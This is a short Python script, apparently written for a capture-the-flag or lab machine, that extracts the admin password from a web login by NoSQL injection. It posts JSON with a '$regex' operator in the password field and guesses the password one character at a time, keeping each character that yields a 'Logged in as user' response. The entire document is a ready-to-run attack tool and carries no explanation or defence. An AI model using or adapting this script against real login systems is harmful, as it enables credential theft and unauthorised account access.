#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://10.10.10.10/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
user = "admin"

def makeNoSQLI():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(0,100):
        for character in characters:
            
            post_data = '{"username":"%s","password":{"$regex":"^%s%s"}}' % (user,password,character)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text: 
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeNoSQLI()
